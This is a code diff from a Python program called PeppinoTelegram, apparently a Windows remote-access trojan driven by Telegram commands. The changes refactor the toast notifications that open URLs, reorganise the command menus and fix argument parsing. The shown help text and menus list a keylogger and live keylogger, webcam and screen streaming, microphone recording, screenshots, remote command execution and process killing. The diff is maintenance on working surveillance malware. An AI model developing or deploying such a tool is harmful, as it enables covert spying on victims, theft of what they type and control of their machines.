@@ -63,9 +63,9 @@ from tempfile import gettempdir
 from typing import Any, Callable
 from io import BytesIO, StringIO
 from random import choice, randint
+from winotify import audio, Notification
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
-from windows_toasts import Toast, WindowsToaster
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
@@ -269,6 +269,7 @@ webcamandscreenstreamstart - Sets you a link to a webcam and screen stream.
 webcamandscreenstreamstop - Stops the webcam and screen stream.
 
 🔊 Audio & Volume
+urltoast - Shows a url opening windows toast.
 breath - Play breathing sound.
 pss - Play "psst" sound.
 microphone - Record mic audio.
@@ -320,7 +321,6 @@ livekeylogger - Sends live updates about what's being typed on the keyboard.
 
 🦑 Misc
 plankton - Plankton.
-urltoast - Shows a url opening windows toast.
 planktonnoaudio - Plankton no audio.
 johnpork - John Pork.
 johnporknoaudio - John Prok no audio.
@@ -490,15 +490,17 @@ def pad_to_16_9(image):
         padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
     return padded
 
-def notify_toast(title: str, main_text: str, description: str, on_activated: Callable|None=None, on_dismissed: Callable|None=None, toaster:WindowsToaster|None=None) -> None:
-    if not toaster:
-        toaster = WindowsToaster(title)
-    toaster.show_toast(
-        Toast(
-            [main_text,
-             description], on_activated=on_activated, on_dismissed=on_dismissed
-        )
+def notify_toast(appname: str, title: str, message: str, url_label: str, url: str) -> None:
+    toast = Notification(
+        app_id=appname, 
+        title=title,
+        msg=message,
+        duration="short",
     )
+
+    toast.add_actions(label=url_label, launch=url)
+    toast.set_audio(audio.Default, loop=False)
+    toast.show()
 
 def terminate_process_by_name(process_name: str) -> None:
     for proc in psutil.process_iter():
@@ -1219,7 +1221,7 @@ class PeppinoTelegram:
             "jumpscare":self.jumpscare,
             "keylogger":self.keylogger,
             "screenshot":self.screenshot,
-            "urltoast":self.browser_opening_toast,
+            "urltoast":notify_toast,
             "messagebox":self.message_box,
             "waitforface":self.waitforface,
             "webcamclip":self.record_webcam,
@@ -1325,9 +1327,6 @@ class PeppinoTelegram:
 
     def breath(self) -> None:
         self.__play_loaded_sound("breath")
-
-    def browser_opening_toast(self, title: str, main_text: str, descritpion: str, url: str) -> None:
-        notify_toast(title, main_text, descritpion, on_activated=lambda *args: browseropen(url), on_dismissed=lambda *args: browseropen(url))
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
         if retries>3:
@@ -1669,6 +1668,7 @@ class PeppinoTelegram:
             "🔙 Back": "/mainmenu",
             "💨 Breath": "/breath",
             "📢 Pss": "/pss",
+            "🔔 Urltoast": "/urltoast",
             "🎙️ Microphone": "/microphone",
             "🔇 Mutevolume": "/mutevolume",
             "🔊 Fullvolume": "/fullvolume",
@@ -1704,12 +1704,12 @@ class PeppinoTelegram:
     def menu_control(self):
         buttons = {
             "🔙 Back": "/mainmenu",
-            "execute": "/execute",
-            "processkiller": "/processkiller",
-            "terminateprocess": "/terminateprocess",
-            "procmonmenu": "/procmonmenu",
-            "procmonadd": "/procmonadd",
-            "procmonrem": "/procmonrem",
+            "⚙️ Execute": "/execute",
+            "💀 Processkiller": "/processkiller",
+            "🛑 Terminateprocess": "/terminateprocess",
+            "📊 Procmonmenu": "/procmonmenu",
+            "➕ Procmonadd": "/procmonadd",
+            "➖ Procmonrem": "/procmonrem",
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
@@ -1719,7 +1719,6 @@ class PeppinoTelegram:
     def menu_input(self):
         buttons = {
             "🔙 Back": "/mainmenu",
-            "⚙️ Execute": "/execute",
             "🔪 Processkiller": "/processkiller",
             "🛑 Terminateprocess": "/terminateprocess",
             "📋 Procmonmenu": "/procmonmenu",
@@ -1777,7 +1776,6 @@ class PeppinoTelegram:
             "🦑 Plankton": "/plankton",
             "🔇 Planktonnoaudio": "/planktonnoaudio",
             "🐷 Johnpork": "/johnpork",
-            "🔔 Urltoast": "/urltoast",
             "🔕 Johnporknoaudio": "/johnporknoaudio",
             "🛋️ Gabinetti": "/gabinetti",
             "⌨️ Duckyscript": "/duckyscript",
@@ -1842,13 +1840,19 @@ class PeppinoTelegram:
 
         func = self.function_table.get(command)
         if func:
-            function_needed_args = get_required_params(func)[1:]
-            funciton_all_args = get_function_parameters(func)[1:]
+            function_needed_args = get_required_params(func)
+            if function_needed_args[0] == "self":
+                function_needed_args=function_needed_args[1:]
+                
+            function_all_args = get_function_parameters(func)
+            if function_all_args[0] == "self":
+                function_all_args=function_all_args[1:]
+
             try:
                 if func in self.no_background_functions:
                     func(*function_args)
                 else:
-                    if len(function_args) < len(function_needed_args) or len(function_args) > len(funciton_all_args):
+                    if len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args):
                         raise TypeError("Wrong number of arguments for this function")
                     if function_args:
                         thread_args = (*function_args,)
